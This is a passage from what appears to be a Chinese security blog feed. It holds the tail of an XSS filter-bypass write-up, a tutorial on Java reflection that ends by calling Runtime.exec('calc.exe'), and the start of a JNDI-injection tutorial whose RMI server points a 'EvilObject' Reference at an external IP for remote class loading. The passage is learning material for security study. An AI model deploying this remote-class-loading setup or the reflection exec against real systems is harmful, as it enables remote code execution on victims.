<li><p>非return条件下：test和location都会被赋值操作</p>
</li>
</ul>
<p>也就是说非return条件下其实是无难度的xss。</p>
<p>这里我们采用的是<code>&lt;!--&lt;script</code>去闭合而非<code>&lt;!--&lt;script&gt;</code>，后者产生的注释直接会将后面的所有全部注释掉，无法再满足正常的js结构，并且此注释状态不可取消掉。</p>
<p>前者只会把script标签内的部分注释掉（因为没有闭合），并且可以通过特定语句来取消掉注释状态，所以我们现在可以传参<code>a=alert(1);&lt;!--script</code>，这样会符合正常的语句，但会直接location掉，所以我们再重新声明下location，再给一个报错就可以了</p>
<p>最终payload</p>
<p><img src="https://i.loli.net/2020/04/09/wj7HbMp8i4GDL9s.png" alt="TIM截图20200409160838.png"></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>文章内容还是有些地方不太成熟.见谅…</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全学习(一)--Class对象与反射</title>
    <url>/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80-Class%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h3 id="RTTI的理解与介绍"><a href="#RTTI的理解与介绍" class="headerlink" title="RTTI的理解与介绍"></a>RTTI的理解与介绍</h3><p>RTTI (Run-Time Type Identification) 运行时类型识别，作用为在运行时试别一个对象的类型和类的信息</p>
<p>在Java中的RTTI分为两种：传统的”RTTI”与反射机制</p>
<ul>
<li>对于传统的”RTTI”而言，一般是已经在编译期确定了他的类型（比如new)</li>
<li>第二种是反射机制 允许我们运行时发现，使用类的信息，而在java中</li>
</ul>
<p>用来表示运行时类型信息的对应类就是class类。</p>
<h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>jvm中有三个内置类加载器：</p>
<p>Bootstrap ClassLoader：启动类加载器，用于加载java核心库jre/lib/rt.jar</p>
<p>Extension ClassLoader：扩展类加载器，用于加载java扩展库jre/ext/*.jar</p>
<p>Application ClassLoader：应用程序类加载器，自己写的代码都是使用这个加载器来加载的</p>
<p>在类的加载过程中 需要通过双亲委派模型来进行加载，通过知乎上的一个图来理解一下</p>
<p><img src="https://s2.ax1x.com/2020/02/25/3tUkZQ.jpg" alt="3tUkZQ.jpg"></p>
<p>类加载的流程</p>
<p><img src="https://s2.ax1x.com/2020/02/25/3thEGV.jpg" alt="3thEGV.jpg"></p>
<ul>
<li>加载：类加载过程的一个阶段：通过一个类的完全限定查找此类字节码文件，并利用字节码文件创建一个Class对象</li>
<li>链接：验证字节码的安全性和完整性，准备阶段正式为静态域分配存储空间，注意此时只是分配静态成员变量的存储空间，不包含实例成员变量，如果必要的话，解析这个类创建的对其他类的所有引用。</li>
<li>初始化：类加载最后阶段，若该类具有超类，则对其进行初始化，执行静态初始化器和静态初始化成员变量</li>
</ul>
<h3 id="类初始化"><a href="#类初始化" class="headerlink" title="类初始化"></a>类初始化</h3><blockquote>
<p>在类初始化阶段，执行类构造器 <cinit>() 方法。<cinit> 类初始化方法有如下特点：</p>
<p>1.编译器会在将 .java 文件编译成 .class 文件时，收集所有类初始化代码和 static {} 域的代码，收集在一起成为 <cinit>() 方法；<br>        2.子类初始化时会首先调用父类的 <cinit>() 方法；</p>
</blockquote>
<h3 id="Class类与Class对象"><a href="#Class类与Class对象" class="headerlink" title="Class类与Class对象"></a>Class类与Class对象</h3><p>首先先看一下class类的部分源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span>,<span class="title">GenericDeclaration</span>,<span class="title">Type</span>, <span class="title">AnnotatedElement</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ANNOTATION= <span class="number">0x00002000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> ENUM      = <span class="number">0x00004000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SYNTHETIC = <span class="number">0x00001000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">registerNatives</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        registerNatives();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Class</span><span class="params">(ClassLoader loader)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        classLoader = loader;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以清楚的看到class类的构造函数私有函数，也就是说class对象只能由JVM创建和加载。</p>
<p>接下来就详细的说一下class对象的作用：</p>
<p>Class对象代表着自己手动编写类的类型信息</p>
<p>当编写了一个A类，那么在编译的时候，JVM就就会创建一个A类对应的Class对象，并且该Class对象保存了A类对应的类型信息，并且将其保存在.class文件中，那么JVM的这么做的意义是什么呢？</p>
<p>当我们new一个新对象或者引用静态成员变量时，Java虚拟机(JVM)中的类加载器子系统会将对应Class对象加载到JVM中，然后JVM再根据这个类型信息相关的Class对象创建我们需要实例对象或者提供静态变量的引用值。所以class对象对于类的实例化是有着很大作用的，可以说他相当于类实例化的模板。</p>
<p>而我们也可以从这个过程中看出Java程序在它们开始运行之前并非被完全加载到内存的，其各个部分是按需加载。在使用一个类的时候，类加载器会先去看这个Class对象是否已经被加载，在没加载的情况情况下，类加载器会默认去加载.class文件，并且在这个字节码文件被加载的过程中需要接受安全机制的验证，最终加载到内存中。</p>
<p><strong>初始化是类加载的最后一个阶段，也就是说完成这个阶段后类也就加载到内存中(Class对象在加载阶段已被创建)，此时可以对类进行各种必要的操作了（如new对象，调用静态成员等），注意在这个阶段，才真正开始执行类中定义的Java程序代码或者字节码。</strong></p>
<h3 id="Java中反射机制"><a href="#Java中反射机制" class="headerlink" title="Java中反射机制"></a>Java中反射机制</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Java反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。</p>
<h4 id="Class对象的获取"><a href="#Class对象的获取" class="headerlink" title="Class对象的获取"></a>Class对象的获取</h4><h5 id="class-forName方法"><a href="#class-forName方法" class="headerlink" title="class.forName方法"></a>class.forName方法</h5><p>Class.forName(“类名”)  通过类名字符串来获取Class对象，当然这种方法在你不拥有该类对象的时候使用更为方便，在拥有类对象的时候，使用getClass方法获取class对象无疑是更合适的，也就是接下来要说的第二种Class 对象获取方法</p>
<h5 id="getClass方法"><a href="#getClass方法" class="headerlink" title="getClass方法"></a>getClass方法</h5><p>这种方法首先要创建类型的对象，再通过类型的对象来获得此对象的Class对象，并且这个方法属于Object类中的方法，它是所有类的祖先类，所以使用每个类的对象都可以调用这一方法。</p>
<h5 id="class-类字面常量"><a href="#class-类字面常量" class="headerlink" title=".class 类字面常量"></a>.class 类字面常量</h5><p>获取方法为类名.class,使用，但通过.class获取class对象与上面的两种方式是有不同之处的，使用<code>.class</code>方法获取Class对象引用时，并不会自动的初始化该类的Class对象。</p>
<p>看到一篇文章中的例子蛮经典的，拿来举例一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Initable</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> final int staticFinal = <span class="number">47</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> final int staticFinal2 =</span><br><span class="line">    ClassInitialization.rand.nextInt(<span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"Initializing Initable"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Initable2</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> int staticNonFinal = <span class="number">147</span>;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"Initializing Initable2"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Initable3</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> int staticNonFinal = <span class="number">74</span>;</span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"Initializing Initable3"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ClassInitialization</span> </span>&#123;</span><br><span class="line">  public <span class="keyword">static</span> Random rand = <span class="keyword">new</span> Random(<span class="number">47</span>);</span><br><span class="line">  public <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="built_in">String</span>[] args) throws Exception &#123;</span><br><span class="line">    </span><br><span class="line">    Class initable = Initable.class;</span><br><span class="line">    System.out.println(<span class="string">"After creating Initable ref"</span>);</span><br><span class="line">    </span><br><span class="line">    System.out.println(Initable.staticFinal);</span><br><span class="line">    </span><br><span class="line">    System.out.println(Initable.staticFinal2);</span><br><span class="line">    </span><br><span class="line">    System.out.println(Initable2.staticNonFinal);</span><br><span class="line">    </span><br><span class="line">    Class initable3 = Class.forName(<span class="string">"Initable3"</span>);</span><br><span class="line">    System.out.println(<span class="string">"After creating Initable3 ref"</span>);</span><br><span class="line">    System.out.println(Initable3.staticNonFinal);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>运行结果：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">After creating Initable ref</span><br><span class="line"><span class="number">47</span></span><br><span class="line">Initializing Initable</span><br><span class="line"><span class="number">258</span></span><br><span class="line">Initializing Initable2</span><br><span class="line"><span class="number">147</span></span><br><span class="line">Initializing Initable3</span><br><span class="line">After creating Initable3 ref</span><br><span class="line"><span class="number">74</span></span><br></pre></td></tr></table></figure>

<p>从这个例子我们就可以明白我在上面所说的.class与getClass()和Class.forname的不同了。</p>
<p>通过.class获取的initable类的Class对象并没进行类的初始化，并且调用了staticFinal也没有进行类的初始化，而是在调用staticFinal2才触发到初始化。</p>
<p>因为staticFinal属于编译期静态常量，在编译阶段通过常量传播优化的方式将Initable类的常量<code>staticFinal</code>存储到了一个称为NotInitialization类的常量池中，之后的常量调用直接会从NotInitialization的常量池进行调用，而staticFinal2的调用触发初始化的原因是：虽然它也被static final修饰，但并不是常量，剩下的就比较好理解了，调用了静态常量触发了类初始化和Class.forName触发了类的初始化。</p>
<h5 id="获取类的所有变量"><a href="#获取类的所有变量" class="headerlink" title="获取类的所有变量"></a>获取类的所有变量</h5><ul>
<li>getFields: 获取所有public访问权限</li>
<li>getDeclaredFields: 获取本类的所有声明变量（无论什么权限）</li>
</ul>
<h5 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h5><ul>
<li>getMethods：获取自己声明的和父类继承的所有public方法</li>
<li>getDeclaredMethods ：获取本类的所有方法（任何访问权限）</li>
<li>getMethod : 方法返回一个特定的方法，第一个参数为方法名称，第二个为对应的class对象</li>
</ul>
<h5 id="通过反射来创建对象"><a href="#通过反射来创建对象" class="headerlink" title="通过反射来创建对象"></a>通过反射来创建对象</h5><p>还是先来一段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Persion类中有两个构造函数，分别public类型的有参构造函数和无参构造函数</p>
<ul>
<li>Public无参类型反射创建对象：对于这种无参类型的public构造函数，直接可以newInstance创建对象实例</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person person=Person<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">person.setAge(<span class="number">18</span>);</span><br><span class="line">person.setName(<span class="string">"likly"</span>);</span><br><span class="line">System.out.println(person);</span><br></pre></td></tr></table></figure>

<ul>
<li>对于有参数的public类型：通过getConstructor函数进行反射</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class p=Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Constructor constructor=p.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">Person person1 = (Person) constructor.newInstance(<span class="string">"Likly"</span>,<span class="number">23</span>);</span><br><span class="line">System.out.println(person1);</span><br></pre></td></tr></table></figure>

<ul>
<li>当构造函数为私有类型：getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和<br>getConstructor 类似。</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">clazz.getMethod("exec", String.class).invoke(m.newInstance(), "calc.exe");</span><br></pre></td></tr></table></figure>

<p>过程为：</p>
<ol>
<li>先获取class对象</li>
<li>通过getDeclaredConstructor获得指定参数的构造方法</li>
<li>接下来调用<code>setAccessible(true)</code>绕过private修饰符检查</li>
<li>通过newInstance获得类实例对象</li>
</ol>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://zhuanlan.zhihu.com/p/60294147" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/60294147</a></p>
<p><a href="https://blog.csdn.net/searchin_r/article/details/84592516" target="_blank" rel="noopener">https://blog.csdn.net/searchin_r/article/details/84592516</a></p>
<p><a href="https://blog.csdn.net/liuxiao723846/article/details/90346160?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/liuxiao723846/article/details/90346160?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>
<p><a href="https://blog.csdn.net/gdutxiaoxu/article/details/68947735" target="_blank" rel="noopener">https://blog.csdn.net/gdutxiaoxu/article/details/68947735</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全学习(二)--JNDI注入</title>
    <url>/2020/02/28/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C-JNDI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="基本概念介绍"><a href="#基本概念介绍" class="headerlink" title="基本概念介绍"></a>基本概念介绍</h3><p>本来不太想写这部分的…想了想…以后看的时候或许方便一些，还是写吧..</p>
<h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>Java RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序<strong>编程接口</strong>。</p>
<p>RMI 使用 JRMP（Java Remote Message Protocol，Java远程消息交换协议）实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。</p>
<p>RMI的简单实现</p>
<p>Server端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义远程对象的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册远程对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException </span>&#123;</span><br><span class="line">        HelloServiceImpl helloService = <span class="keyword">new</span> HelloServiceImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">"rmi://127.0.0.1/hello"</span>,helloService);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException </span>&#123;</span><br><span class="line">        HelloService helloService = (HelloService) Naming.lookup(<span class="string">"rmi://127.0.0.1/hello"</span>);</span><br><span class="line">        System.out.println(helloService.say());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="RMI的调用机制"><a href="#RMI的调用机制" class="headerlink" title="RMI的调用机制"></a>RMI的调用机制</h5><p>RMI 采用stubs 和 skeletons 来进行远程对象(remote object)的通讯。stub 充当远程对象的客户端代理，有着和远程对象相同的远程接口，远程对象的调用实际是通过调用该对象的客户端代理对象stub来完成的。</p>
<h5 id="RMI调用过程"><a href="#RMI调用过程" class="headerlink" title="RMI调用过程"></a>RMI调用过程</h5><p><img src="https://s2.ax1x.com/2020/02/27/3weKWF.png" alt="3weKWF.png"></p>
<p>客户端调用stub(存根上的方法)，存根负责将要调用的远程对象方法的方法名以及其参数编组打包，并且通过Socket通信发送给Skeleton，Skeleton将客户端发送过来的数据包中的方法名以及编组的参数进行解析，并且在服务端将此方法执行，执行完毕后将返回值通过相反的路径返回给客户端Stub，Stub将返回结果解析后给客户程序。</p>
<h3 id="RMI-JNDI注入"><a href="#RMI-JNDI注入" class="headerlink" title="RMI+JNDI注入"></a>RMI+JNDI注入</h3><p>RMIClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"rmi://localhost:8080/refObj"</span>);</span><br><span class="line">            String data = <span class="string">"This is RMI Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIServer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8080</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>, <span class="string">"EvilObject"</span>, <span class="string">"http://139.224.236.99/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:8080/refObj'"</span>);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行触发</p>
<p><img src="https://s2.ax1x.com/2020/02/27/3wzsWq.png" alt="3wzsWq.png"></p>
<p>调用链分析</p>
<p><img src="https://s2.ax1x.com/2020/02/27/30lnZ4.png" alt="30lnZ4.png"></p>
<p>InitialContext.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GenericURLContext.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="comment">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span></span><br><span class="line">    <span class="comment">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span></span><br><span class="line">    <span class="comment">//进入不同的协议路线</span></span><br><span class="line">    ResolveResult var2 = <span class="keyword">this</span>.getRootURLContext(var1, <span class="keyword">this</span>.myEnv);<span class="comment">//获取RMI注册中心相关数据</span></span><br><span class="line">    Context var3 = (Context)var2.getResolvedObj();<span class="comment">//获取注册中心对象</span></span><br><span class="line"></span><br><span class="line">    Object var4;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var4 = var3.lookup(var2.getRemainingName());<span class="comment">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        var3.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RegistryContext.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RegistryContext.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//如果是Reference对象的话,将进行一次RMI服务器的链接,获取远程class文件</span></span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>NamingManager.java</p>
